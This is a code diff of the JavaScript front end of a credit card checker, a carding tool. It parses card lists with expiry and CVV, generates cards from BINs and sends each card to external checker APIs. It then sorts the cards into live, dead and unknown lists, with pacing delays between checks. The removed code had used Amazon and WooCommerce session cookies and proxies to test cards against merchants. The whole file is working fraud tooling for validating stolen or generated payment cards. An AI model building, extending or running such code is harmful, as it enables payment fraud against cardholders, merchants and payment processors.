@@ -3,7 +3,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const root = document.documentElement;
     const hiddenColorPicker = document.getElementById('hiddenColorPicker');
     const colorPickerBtn = document.getElementById('colorPickerBtn');
-    const defaultAccent = '#97bc52';
+    const defaultAccent = '#0000FF'; // Blue color
 
     function hexToRgbArray(hex) {
         let r = 0, g = 0, b = 0;
@@ -108,8 +108,7 @@ var maxThreads = 1;
 var activeThreads = 0;
 var processingQueue = [];
 var stopped = true;
-var totalItems = 0; var testedItems = 0; var approvedItems = 0; var declinedItems = 0; var liveResultItems = 0; var errorItems = 0;
-var checkDelay = 150; 
+var totalItems = 0; var testedItems = 0; var liveResultItems = 0; var declinedItems = 0; var unknownItems = 0; var errorItems = 0;
 toastr.options = { "closeButton": true, "debug": false, "newestOnTop": true, "progressBar": true, "positionClass": "toast-top-right", "preventDuplicates": false, "onclick": null, "showDuration": "300", "hideDuration": "1000", "timeOut": "4000", "extendedTimeOut": "1000", "showEasing": "swing", "hideEasing": "linear", "showMethod": "fadeIn", "hideMethod": "fadeOut" };
 var activeAjaxRequests = [];
 var currentGateForBatch = '';
@@ -119,15 +118,15 @@ function getCardDetails(cc) { if ((cc.startsWith("34") || cc.startsWith("37")) &
 function extractValidCCFormat(e) { const t = e.split('\n').filter((e => "" !== e.trim())), o = new Set, n = new Date, s = n.getFullYear(), r = n.getMonth() + 1; return t.forEach((e => { let t = e.replace(/[^0-9]/g, ' ').trim(); const n = t.split(/\s+/).filter((e => e.length > 0)); if (n.length < 3) return; let l = "", i = -1; let c = t.match(/\b(\d{13}|\d{15,16})\b/); if (c) { l = c[0]; const cardParts=l.match(/\d+/g)||[]; const lastPart=cardParts.pop(); if(lastPart){ for(let k=0;k<n.length;k++){ if(n[k].endsWith(lastPart) && n.slice(0,k+1).join('').endsWith(l)){ i=k; break; } } if(i===-1 && n.includes(l)) i = n.indexOf(l); } } else { for (let e = 0; e < n.length - 2; e++) { let t = n.slice(0, e + 1).join(''); if (t.length === 13 || t.length === 15 || t.length === 16) { l = t, i = e; break; } } } if (!l || i === -1) return; const cardDetails = getCardDetails(l); if (!cardDetails || !isValidLuhn(l)) return; const m = i + 1; if (m >= n.length) return; const h = n[m].match(/^(0?[1-9]|1[0-2])$/); if (!h) return; const g = h[1].padStart(2, '0'); const p = m + 1; if (p >= n.length) return; let v; let yearStr = n[p]; if (yearStr.length === 2 && /^\d+$/.test(yearStr)) { v = parseInt(`20${yearStr}`, 10); } else if (yearStr.length === 4 && /^\d+$/.test(yearStr)) { v = parseInt(yearStr, 10); } else { return; } if (isNaN(v) || v < s || v > s + 20) return; if (v === s && parseInt(g) < r) return; let f = `${l}|${g}|${v}`; const k = p + 1; if (k < n.length) { const cvvMatch = n[k].match(/^\d{3,4}$/); if (cvvMatch) { const cvv = cvvMatch[0]; if ((cardDetails.type === "AMEX" && cvv.length === 4) || (cardDetails.type !== "AMEX" && cvv.length === 3)) { f += `|${cvv}`; } } } o.add(f); })), Array.from(o).join('\n') || ""; }
 
 function updateStats() {
-    $('.counters .counter.approved .counter-value.approved').text(approvedItems);
     $('.counters .counter.live .counter-value.aprovadas').text(liveResultItems);
     $('.counters .counter.declined .counter-value.reprovadas').text(declinedItems + errorItems);
-    $('.result-block-title .badge.badge-success.approved').text(approvedItems);
+    $('.counters .counter.unknown .counter-value.unknown').text(unknownItems);
     $('.result-block-title .badge.badge-warning.aprovadas').text(liveResultItems);
     $('.result-block-title .badge.badge-danger.reprovadas').text(declinedItems + errorItems);
-    $('.result-block-total span.approved').text(approvedItems);
+    $('.result-block-title .badge.badge-info.unknown').text(unknownItems);
     $('.result-block-total span.aprovadas').text(liveResultItems);
     $('.result-block-total span.reprovadas').text(declinedItems + errorItems);
+    $('.result-block-total span.unknown').text(unknownItems);
     const progressBar = $('#main-progress-bar');
     if (progressBar.length) {
         if (totalItems > 0 && testedItems >= 0) {
@@ -199,41 +198,25 @@ function checkItem(currentItem, gateForThisItem) {
     }
     const reqData = { lista: currentItem };
 
-    if (gateForThisItem !== 'Amazon.php' && $('#proxy-toggle').is(':checked')) {
-        const allProxies = $('#proxy_input').val().trim();
-        if (allProxies) {
-            reqData.use_proxy = 'true';
-            reqData.proxies = allProxies;
-            reqData.proxy_type = $('#proxy_type').val();
-        }
+    let apiUrl = '';
+    let requestType = 'GET';
+    let requestData = {};
+
+    if (gateForThisItem === "rnd_cc_gateway") {
+        apiUrl = `https://chkr-api.vercel.app/api/check?cc=${currentItem}`;
+    } else if (gateForThisItem === "b3_cc_gateway") {
+        apiUrl = `https://checker-lake.vercel.app/api/check?card=${currentItem}`;
+    } else {
+        handleCheckError(currentItem, "UNKNOWN GATEWAY SELECTED");
+        finishCheckItem(currentItem);
+        return;
     }
 
-    if (gateForThisItem === "Auto.php") {
-        let cookie = $("#manual_cookie").val().trim();
-        let link = $("#link_site").val().trim();
-        if (!cookie || !link) {
-            handleCheckError(currentItem, "MISSING WOOCOMMERCE COOKIE OR LINK");
-            finishCheckItem(currentItem);
-            return;
-        }
-        reqData.manual_cookie = cookie;
-        reqData.link_site = link;
-    } else if (gateForThisItem === "Amazon.php") {
-         let region = $("#amazon_region").val();
-         let cookie = $("#amazon_cookie").val().trim();
-         if (!cookie) {
-             handleCheckError(currentItem, "MISSING AMAZON COOKIE");
-             finishCheckItem(currentItem);
-             return;
-         }
-         reqData.amazon_region = region;
-         reqData.amazon_cookie = cookie;
-    }
     
     const xhr = $.ajax({
-        url: gateForThisItem,
-        type: 'GET',
-        data: reqData
+        url: apiUrl,
+        type: requestType,
+        data: requestData
     });
     xhr.currentItemForAbort = currentItem;
     activeAjaxRequests.push(xhr);
@@ -254,29 +237,49 @@ function checkItem(currentItem, gateForThisItem) {
 }
 
 
-function handleApiResponse(card, responseText) {
+function handleApiResponse(card, response) {
     try {
         if (stopped) return;
-        const resText = responseText || "[EMPTY RESPONSE]";
-        const resLow = String(resText).toLowerCase();
         const displayCard = card;
-        if (resLow.includes("approved")) {
-            approvedItems++;
-            $('#lista_approved').append(`<div class="approved-entry">${displayCard} - ${resText}</div>`);
-            const approvedEntry = $('#lista_approved').children().last();
-            approvedEntry.css({ backgroundColor: 'var(--status-success-light)' });
-            setTimeout(() => approvedEntry.css({ backgroundColor: '' }), 1000);
-            try { successSound.play().catch(()=>{}); } catch(e) {}
-        } else if (resLow.includes("live")) {
-             liveResultItems++;
-             $('#lista_aprovadas').append(`<div class="live-entry">${displayCard} - ${resText}</div>`);
-             const liveEntry = $('#lista_aprovadas').children().last();
-             liveEntry.css({ backgroundColor: 'var(--status-live-light)' });
-             setTimeout(() => liveEntry.css({ backgroundColor: '' }), 1000);
-             try { audio.play().catch(()=>{}); } catch(e) {}
-        } else {
-             declinedItems++;
-             $('#lista_reprovadas').append(`<div class="declined-entry">${displayCard} - ${resText}</div>`);
+        let isLive = false;
+        let isDeclined = false;
+
+        if (currentGateForBatch === "rnd_cc_gateway") {
+            if (response && response.code === 0 && response.status === "Die") {
+                isDeclined = true;
+            } else if (response && (response.status === "Approved" || response.status === "Live")) {
+                isLive = true;
+            }
+            // If response.status is "Unknown" or anything else not explicitly handled,
+            // isLive and isDeclined remain false, causing it to fall into the final 'else' block for unknown.
+        } else if (currentGateForBatch === "b3_cc_gateway") {
+            if (response && response.is_approved === false && response.status === "DECLINED") {
+                isDeclined = true;
+            } else if (response && response.is_approved === true) {
+                isLive = true;
+            }
+            // If response.status is "UNKNOWN" or anything else not explicitly handled,
+            // isLive and isDeclined remain false, causing it to fall into the final 'else' block for unknown.
+        }
+        // If currentGateForBatch is unknown, isLive and isDeclined remain false,
+        // causing it to fall into the final 'else' block for unknown.
+
+        if (isLive) {
+            liveResultItems++;
+            $('#lista_aprovadas').append(`<div class="live-entry">${displayCard}</div>`);
+            const liveEntry = $('#lista_aprovadas').children().last();
+            liveEntry.css({ backgroundColor: 'var(--status-live-light)' });
+            setTimeout(() => liveEntry.css({ backgroundColor: '' }), 1000);
+            try { audio.play().catch(()=>{}); } catch(e) {}
+        } else if (isDeclined) {
+            declinedItems++;
+            $('#lista_reprovadas').append(`<div class="declined-entry">${displayCard}</div>`);
+        } else { // Unknown status
+            unknownItems++;
+            $('#lista_unknown').append(`<div class="unknown-entry">${displayCard}</div>`);
+            const unknownEntry = $('#lista_unknown').children().last();
+            unknownEntry.css({ backgroundColor: 'var(--status-info-light)' });
+            setTimeout(() => unknownEntry.css({ backgroundColor: '' }), 1000);
         }
     } catch (err) {
         console.error("ERROR PROCESSING RESPONSE:", err);
@@ -297,7 +300,13 @@ function handleCheckError(card, message) {
 function finishCheckItem(card) {
     removeLineFromTextarea(card);
     if (activeThreads > 0) activeThreads--;
-    setTimeout(processQueue, checkDelay);
+    let delay = 150; // Default delay
+    if (currentGateForBatch === "rnd_cc_gateway") {
+        delay = 3000; // 3 seconds
+    } else if (currentGateForBatch === "b3_cc_gateway") {
+        delay = 17000; // 17 seconds
+    }
+    setTimeout(processQueue, delay);
 }
 
 function cleanGenCVV(e, i) { return String(e).replace(/[^0-9]/g, '').slice(0, i ? 4 : 3); }
@@ -450,19 +459,16 @@ function copyGeneratedList(){
 }
 
 function disableInputs() {
-    $("#input-list, #bin, #gencvv, #genqty, #month, #year, #generateBtn, #copyGenBtn, #gate, #manual_cookie, #link_site, #amazon_region, #amazon_cookie, #wooTutorialAndroidBtn, #wooTutorialWindowsBtn, #proxy-toggle, #proxy_input, #proxy_type, #checker-speed").prop("disabled", true);
+    $("#input-list, #bin, #gencvv, #genqty, #month, #year, #generateBtn, #copyGenBtn, #gate, #checker-speed").prop("disabled", true);
     $("#btn-start").prop("disabled", true);
     $("#btn-stop").prop("disabled", false);
+    $("#delay-timer-display").hide(); // Hide timer when disabled
 }
 function enableInputs() {
-    $("#input-list, #bin, #gencvv, #genqty, #month, #year, #generateBtn, #copyGenBtn, #gate, #proxy-toggle, #proxy_input, #proxy_type, #checker-speed").prop("disabled", false);
+    $("#input-list, #bin, #gencvv, #genqty, #month, #year, #generateBtn, #copyGenBtn, #gate, #checker-speed").prop("disabled", false);
     const selGate = $('#gate').val();
-    $('#manual_cookie').prop('disabled', selGate !== 'Auto.php');
-    $('#link_site').prop('disabled', selGate !== 'Auto.php');
-    $('#wooTutorialAndroidBtn').prop('disabled', selGate !== 'Auto.php' || !stopped);
-    $('#wooTutorialWindowsBtn').prop('disabled', selGate !== 'Auto.php' || !stopped);
-    $('#amazon_region').prop('disabled', selGate !== 'Amazon.php');
-    $('#amazon_cookie').prop('disabled', selGate !== 'Amazon.php');
+    $("#delay-timer-display").hide(); // Hide timer when inputs are enabled (not checking)
+
     if(stopped) {
         $("#btn-start").prop("disabled", false);
         $("#btn-stop").prop("disabled", true);
@@ -472,22 +478,6 @@ function enableInputs() {
     }
 }
 
-function updateAmazonHelperLink() {
-    const regionSelect = document.getElementById('amazon_region');
-    const helperLinkSpan = document.getElementById('amazon-cookie-helper-link');
-    if (!regionSelect || !helperLinkSpan) { if (helperLinkSpan) $(helperLinkSpan).hide(); return; }
-    const selectedRegion = regionSelect.value;
-    let linkUrl = ''; let linkText = 'GET COOKIE FROM THIS PAGE';
-    switch (selectedRegion) {
-        case 'it': linkUrl = 'https://www.amazon.it/ax/account/manage'; break;
-        case 'ca': linkUrl = 'https://www.amazon.ca/ax/account/manage'; break;
-        case 'us': linkUrl = 'https://www.amazon.com/ax/account/manage'; break;
-        case 'mx': linkUrl = 'https://www.amazon.com.mx/ax/account/manage'; break;
-        case 'jp': linkUrl = 'https://www.amazon.co.jp/ax/account/manage'; break;
-    }
-    if (linkUrl) $(helperLinkSpan).html(`(<a href="${linkUrl}" target="_blank" rel="noopener noreferrer" title="Go to Amazon Account Management">${linkText}</a>)`).show();
-    else $(helperLinkSpan).html('').hide();
-}
 
 function resetApplication(elements) {
     if (!stopped) {
@@ -495,14 +485,13 @@ function resetApplication(elements) {
         toastr.info("Checker was stopped before resetting.");
     }
 
-    $('#lista_approved, #lista_aprovadas, #lista_reprovadas').empty();
-    approvedItems = 0; liveResultItems = 0; declinedItems = 0; errorItems = 0; totalItems = 0; testedItems = 0;
+    $('#lista_aprovadas, #lista_reprovadas, #lista_unknown').empty();
+    liveResultItems = 0; declinedItems = 0; unknownItems = 0; errorItems = 0; totalItems = 0; testedItems = 0;
     
     const keysToRemove = [
-        'themeAccentColor', 'theme', 'gateValue', 'link_site_value', 
-        'manualCookieValue', 'amazonRegionValue', 'amazonCookieValue', 'binValue',
+        'themeAccentColor', 'theme', 'gateValue', 'binValue',
         'gencvvValue', 'genqtyValue', 'monthValue', 'yearValue',
-        'inputValue', 'proxyInputValue', 'proxyTypeValue', 'proxyEnabled', 'checkerSpeedValue'
+        'inputValue', 'checkerSpeedValue'
     ];
     keysToRemove.forEach(key => localStorage.removeItem(key));
 
@@ -510,28 +499,20 @@ function resetApplication(elements) {
     elements.cvvIn.val('');
     elements.qtyIn.val('10');
     elements.inputList.val('');
-    elements.manualCookie.val('');
-    elements.linkSite.val('');
-    elements.amazonCookie.val('');
-    elements.proxyInput.val('');
     
     elements.moIn.val('Random');
     elements.yrIn.val('Random');
-    elements.gate.val('Amazon.php');
-    elements.amazonRegion.val('it');
-    elements.proxyType.val('http');
+    elements.gate.val('rnd_cc_gateway');
     elements.checkerSpeed.val('1');
 
-    elements.proxyToggle.prop('checked', false);
     
     // Explicitly find and call the globally scoped functions
     window.applyTheme('dark'); 
-    window.applyAccentColor('#97bc52');
+    window.applyAccentColor('#0000FF');
     
     updateStats();
     updateCardListCount();
     updateConditionalInputs();
-    updateProxyInputs();
     
     if (typeof createSnakes === 'function') {
         createSnakes();
@@ -642,28 +623,19 @@ $(document).ready(function() {
     drawSnakes();
 
     const elements = {
-        gate: $('#gate'), linkSite: $('#link_site'), manualCookie: $('#manual_cookie'),
-        amazonRegion: $('#amazon_region'), amazonCookie: $('#amazon_cookie'), amazonCookieHelper: $('#amazon-cookie-helper-link'),
+        gate: $('#gate'),
         inputList: $('#input-list'), paymentIcon: $('#paymentIcon'), genBtn: $('#generateBtn'), copyGenBtn: $('#copyGenBtn'),
         startBtn: $('#btn-start'), stopBtn: $('#btn-stop'), cleanAllBtn: $('#btn-clean-all'),
         binIn: $('#bin'), cvvIn: $('#gencvv'), qtyIn: $('#genqty'), moIn: $('#month'), yrIn: $('#year'),
-        manCookieGrp: $('#manual_cookie_group'), linkSiteGrp: $('#link_site_group'), amazonRegionGrp: $('#amazon_region_group'),
-        gateCreditsDisplay: $('#gate-credits-display'), approvedList: $('#lista_approved'), liveList: $('#lista_aprovadas'),
-        declinedList: $('#lista_reprovadas'), copyApprovedBtn: $('.btn-copy-approved'), copyLiveBtn: $('.btn-copy-live'),
-        clearDeclinedBtn: $('.btn-trash'),
-        wooTutorialAndroidBtn: $('#wooTutorialAndroidBtn'), wooTutorialWindowsBtn: $('#wooTutorialWindowsBtn'),
-        wooTutorialGrp: $('#woocommerce_tutorial_group'),
-        proxyToggle: $('#proxy-toggle'), proxyToggleWrapper: $('.proxy-toggle-wrapper'), proxySettingsContainer: $('#proxy-settings-container'),
-        proxyInput: $('#proxy_input'), proxyType: $('#proxy_type'),
+        gateCreditsDisplay: $('#gate-credits-display'), liveList: $('#lista_aprovadas'),
+        declinedList: $('#lista_reprovadas'), unknownList: $('#lista_unknown'),
+        copyLiveBtn: $('.btn-copy-live'), clearDeclinedBtn: $('.btn-trash'), copyUnknownBtn: $('.btn-copy-unknown'),
         checkerSpeed: $('#checker-speed'),
-        resetBtn: $('#resetDataBtn')
+        resetBtn: $('#resetDataBtn'),
+        delayTimerDisplay: $('#delay-timer-display')
     };
 
-    elements.gate.val(localStorage.getItem('gateValue') || 'Amazon.php');
-    elements.linkSite.val(localStorage.getItem('link_site_value') || '');
-    elements.manualCookie.val(localStorage.getItem('manualCookieValue') || '');
-    elements.amazonRegion.val(localStorage.getItem('amazonRegionValue') || 'it');
-    elements.amazonCookie.val(localStorage.getItem('amazonCookieValue') || '');
+    elements.gate.val(localStorage.getItem('gateValue') || 'rnd_cc_gateway');
     elements.binIn.val(localStorage.getItem('binValue') || '');
     elements.cvvIn.val(localStorage.getItem('gencvvValue') || '');
     elements.qtyIn.val(localStorage.getItem('genqtyValue') || '10');
@@ -671,10 +643,6 @@ $(document).ready(function() {
     elements.yrIn.val(localStorage.getItem('yearValue') || 'Random');
     const savedList = localStorage.getItem('inputValue') || '';
     if (savedList) elements.inputList.val(extractValidCCFormat(savedList));
-    elements.proxyInput.val(localStorage.getItem('proxyInputValue') || '');
-    elements.proxyType.val(localStorage.getItem('proxyTypeValue') || 'http');
-    const proxyEnabled = localStorage.getItem('proxyEnabled') === 'true';
-    elements.proxyToggle.prop('checked', proxyEnabled);
     elements.checkerSpeed.val(localStorage.getItem('checkerSpeedValue') || '1');
     elements.checkerSpeed.on('change', function() {
         localStorage.setItem('checkerSpeedValue', $(this).val());
@@ -682,71 +650,27 @@ $(document).ready(function() {
     updateCardListCount();
     updateStats();
 
-    const updateProxyInputs = () => {
-        if (elements.proxyToggle.is(':checked')) {
-            elements.proxySettingsContainer.slideDown(200);
-        } else {
-            elements.proxySettingsContainer.slideUp(200);
-        }
-    };
-
     const updateConditionalInputs = () => {
         const selGate = elements.gate.val();
-        elements.proxyToggleWrapper.show();
-        elements.manCookieGrp.hide();
-        elements.linkSiteGrp.hide();
-        elements.amazonRegionGrp.hide();
-        elements.amazonCookieHelper.hide();
         elements.gateCreditsDisplay.hide().html('');
-        elements.wooTutorialGrp.hide();
+        elements.delayTimerDisplay.hide(); // Hide timer by default
 
         const icons = {
-            'Paypal.php': 'https://cdn.iconscout.com/icon/free/png-512/free-paypal-logo-icon-download-in-svg-png-gif-file-formats--bitcoin-payment-social-media-pack-logos-icons-5582514.png?f=webp&w=512',
-            'Payflow.php': 'https://startup.network/upload/iblock/9e9/Payflow_logo_vertical-_1_.png',
-            'Vbv.php': 'https://cdn3.iconfinder.com/data/icons/leto-finance-money-1/64/credit_card_aproove_check_validation-512.png',
-            'Auto.php': 'https://maksimer.com/wp-content/uploads/sites/3/2023/08/woocommerce-icon-3d-purple.png',
-            'Amazon.php': 'https://cdn-icons-png.flaticon.com/512/14079/14079391.png'
+            'rnd_cc_gateway': 'https://cdn-icons-png.flaticon.com/512/1040/1040230.png', // Example icon for RND
+            'b3_cc_gateway': 'https://cdn-icons-png.flaticon.com/512/1040/1040230.png' // Example icon for B3
         };
-        elements.manualCookie.prop('disabled', true);
-        elements.linkSite.prop('disabled', true);
-        elements.amazonRegion.prop('disabled', true);
-        elements.amazonCookie.prop('disabled', true);
-        elements.wooTutorialAndroidBtn.prop('disabled', true);
-        elements.wooTutorialWindowsBtn.prop('disabled', true);
+        
+        let creditText = `API GATEWAYS: ＶＥＮＥＸ 新ドラゴン`;
 
-        let creditText = `GATE CREDITS: <a href="https://t.me/Venex444" target="_blank" rel="noopener noreferrer"><i class="fab fa-telegram"></i> ＶＥＮＥＸ 新ドラゴン</a>`;
-
-        if (selGate === "Auto.php") {
-            elements.manCookieGrp.show();
-            elements.linkSiteGrp.show();
-            elements.wooTutorialGrp.show();
-            elements.manualCookie.prop('disabled', false);
-            elements.linkSite.prop('disabled', false);
-            elements.wooTutorialAndroidBtn.prop('disabled', !stopped);
-            elements.wooTutorialWindowsBtn.prop('disabled', !stopped);
-        } else if (selGate === "Amazon.php") {
-            elements.amazonRegionGrp.show();
-            elements.amazonRegion.prop('disabled', false);
-            elements.amazonCookie.prop('disabled', false);
-            updateAmazonHelperLink();
-            creditText = `AMAZON GATE CREDITS: <a href="https://t.me/PladixOficial" target="_blank" rel="noopener noreferrer"><i class="fab fa-telegram"></i> PLADIX_OFICIAL</a>`;
-            elements.proxyToggleWrapper.hide();
-        }
         elements.gateCreditsDisplay.html(creditText).show();
-        elements.paymentIcon.attr('src', icons[selGate] || icons['Paypal.php']);
+        elements.paymentIcon.attr('src', icons[selGate] || icons['rnd_cc_gateway']);
     };
     updateConditionalInputs();
-    updateProxyInputs();
 
     elements.gate.on('change', function() {
         localStorage.setItem('gateValue', $(this).val());
         updateConditionalInputs();
-        ['manualCookie', 'linkSite', 'amazonCookie'].forEach(id => $(`#${id}`).removeClass('is-invalid-input'));
     });
-    elements.linkSite.on('input', function() { localStorage.setItem('link_site_value', $(this).val()); $(this).removeClass('is-invalid-input'); });
-    elements.manualCookie.on('input', function() { localStorage.setItem('manualCookieValue', $(this).val()); $(this).removeClass('is-invalid-input'); });
-    elements.amazonRegion.on('change', function() { localStorage.setItem('amazonRegionValue', $(this).val()); updateAmazonHelperLink(); });
-    elements.amazonCookie.on('input', function() { localStorage.setItem('amazonCookieValue', $(this).val()); $(this).removeClass('is-invalid-input');});
     elements.binIn.on('input', function() {
         localStorage.setItem('binValue', $(this).val());
         elements.cvvIn.trigger('input');
@@ -789,12 +713,6 @@ $(document).ready(function() {
         }, 50);
     });
 
-    elements.proxyToggle.on('change', function() {
-        localStorage.setItem('proxyEnabled', $(this).is(':checked'));
-        updateProxyInputs();
-    });
-    elements.proxyInput.on('input', function() { localStorage.setItem('proxyInputValue', $(this).val()); });
-    elements.proxyType.on('change', function() { localStorage.setItem('proxyTypeValue', $(this).val()); });
 
     elements.genBtn.on('click', generate);
     elements.copyGenBtn.on('click', copyGeneratedList);
@@ -830,39 +748,30 @@ $(document).ready(function() {
 
          maxThreads = parseInt(elements.checkerSpeed.val(), 10) || 1;
 
-         if (elements.proxyToggle.is(':checked') && !elements.proxyInput.val().trim()) {
-            toastr.error("PROXY MODE IS ON, BUT PROXY LIST IS EMPTY.", "PROXY ERROR");
-            elements.proxyInput.focus();
-            return;
-         }
-
          currentGateForBatch = elements.gate.val();
-         let gateValid = true;
-         ['manualCookie', 'linkSite', 'amazonCookie'].forEach(id => $(`#${id}`).removeClass('is-invalid-input'));
-
-         if (currentGateForBatch === "Auto.php") {
-             if (!elements.manualCookie.val().trim()) { elements.manualCookie.addClass('is-invalid-input'); gateValid = false; }
-             if (!elements.linkSite.val().trim()) { elements.linkSite.addClass('is-invalid-input'); gateValid = false; }
-             if (!gateValid) { toastr.warning("WOOCOMMERCE REQUIRES COOKIE AND LINK.", "INPUT MISSING"); return; }
-         } else if (currentGateForBatch === "Amazon.php") {
-             if (!elements.amazonCookie.val().trim()) {
-                 elements.amazonCookie.addClass('is-invalid-input');
-                 toastr.warning("AMAZON REQUIRES COOKIE.", "INPUT MISSING");
-                 return;
-             }
-         }
+         // No specific input validation needed for new API gateways beyond card list itself
+         // Removed old gateway specific input validation
 
          processingQueue = listContent.split('\n').filter(Boolean).slice();
          totalItems = processingQueue.length;
          testedItems = 0;
          if ($("#lista_reprovadas > div").length > 0) $("#lista_reprovadas").empty();
+         if ($("#lista_unknown > div").length > 0) $("#lista_unknown").empty();
          declinedItems = 0;
+         unknownItems = 0;
          errorItems = 0;
          activeThreads = 0;
          stopped = false;
          updateStats();
          toastr.info(`STARTING CHECK FOR ${totalItems} CARDS VIA ${$('#gate option:selected').text()}...`);
          $("#checker-status").attr("class", "badge-venex badge-info").html('<i class="fas fa-cog fa-spin"></i> STARTING CHECK...');
+         
+         if (currentGateForBatch === "b3_cc_gateway") {
+            elements.delayTimerDisplay.show().text(`NEXT CHECK IN: 17s`);
+         } else {
+            elements.delayTimerDisplay.hide();
+         }
+
          disableInputs();
          processQueue();
     });
@@ -904,19 +813,18 @@ $(document).ready(function() {
             customClass: { popup: 'swal-custom' }
         }).then((result) => {
             if (result.isConfirmed) {
-                $("#lista_approved, #lista_aprovadas, #lista_reprovadas").empty();
-                approvedItems = 0; liveResultItems = 0; declinedItems = 0; errorItems = 0; testedItems = 0;
+                $("#lista_aprovadas, #lista_reprovadas, #lista_unknown").empty();
+                liveResultItems = 0; declinedItems = 0; unknownItems = 0; errorItems = 0; testedItems = 0;
                 updateStats();
                 toastr.success("ALL RESULTS CLEARED.");
             }
         })
     });
-    elements.copyApprovedBtn.on('click', function() { var listContent = getTextFromDivWithNewlines('lista_approved'); copyToClipboardHelper(listContent, this); });
     elements.copyLiveBtn.on('click', function() { var listContent = getTextFromDivWithNewlines('lista_aprovadas'); copyToClipboardHelper(listContent, this); });
     elements.clearDeclinedBtn.on('click', function() {
         Swal.fire({
-            title: 'CLEAR DECLINED/ERRORS?',
-            text: "CLEARS ONLY DECLINED/ERROR LIST AND COUNTER.",
+            title: 'CLEAR DEAD/ERRORS?',
+            text: "CLEARS ONLY DEAD/ERROR LIST AND COUNTER.",
             icon: 'warning',
             showCancelButton: true,
             confirmButtonColor: 'var(--status-success)',
@@ -929,35 +837,28 @@ $(document).ready(function() {
                 $('#lista_reprovadas').empty();
                 declinedItems = 0; errorItems = 0;
                 updateStats();
-                toastr.success("DECLINED/ERROR LIST CLEARED.");
+                toastr.success("DEAD/ERROR LIST CLEARED.");
             }
         })
     });
+    elements.copyUnknownBtn.on('click', function() { var listContent = getTextFromDivWithNewlines('lista_unknown'); copyToClipboardHelper(listContent, this); });
 
-    elements.wooTutorialAndroidBtn.on('click', function() {
-        Swal.fire({
-            title: 'WOOCOMMERCE ANDROID TUTORIAL',
-            html: `<video width="100%" height="auto" controls autoplay playsinline><source src="android_tutorial.mp4" type="video/mp4">Your browser does not support video playback.</video>`,
-            showConfirmButton: false, width: '80vw', maxWidth: '800px',
-            background: document.body.classList.contains('light-mode') ? 'var(--lm-bg-secondary)' : 'var(--bg-secondary)',
-            customClass: { popup: 'swal-custom swal-embed', title: 'swal-custom-title', htmlContainer: 'swal-custom-html-container' },
-            showCloseButton: true,
-            onOpen: () => { const vid = Swal.getHtmlContainer().querySelector('video'); if (vid) vid.play().catch(e => console.warn("Android tutorial video autoplay prevented:", e)); }
-        });
-    });
-
-    elements.wooTutorialWindowsBtn.on('click', function() {
-        Swal.fire({
-            title: 'WOOCOMMERCE WINDOWS TUTORIAL',
-            html: `<video width="100%" height="auto" controls autoplay playsinline><source src="windows_tutorial.mp4" type="video/mp4">Your browser does not support video playback.</video>`,
-            showConfirmButton: false, width: '80vw', maxWidth: '800px',
-            background: document.body.classList.contains('light-mode') ? 'var(--lm-bg-secondary)' : 'var(--bg-secondary)',
-            customClass: { popup: 'swal-custom swal-embed', title: 'swal-custom-title', htmlContainer: 'swal-custom-html-container' },
-            showCloseButton: true,
-            onOpen: () => { const vid = Swal.getHtmlContainer().querySelector('video'); if (vid) vid.play().catch(e => console.warn("Windows tutorial video autoplay prevented:", e)); }
-        });
-    });
 
     enableInputs();
     updateConditionalInputs();
+
+    const menuBtn = document.getElementById('menuBtn');
+    const menuDropdown = document.getElementById('menuDropdown');
+
+    menuBtn.addEventListener('click', (event) => {
+        console.log('Menu button clicked');
+        event.stopPropagation();
+        menuDropdown.classList.toggle('show');
+    });
+
+    document.addEventListener('click', (event) => {
+        if (!menuDropdown.contains(event.target) && !menuBtn.contains(event.target)) {
+            menuDropdown.classList.remove('show');
+        }
+    });
 });
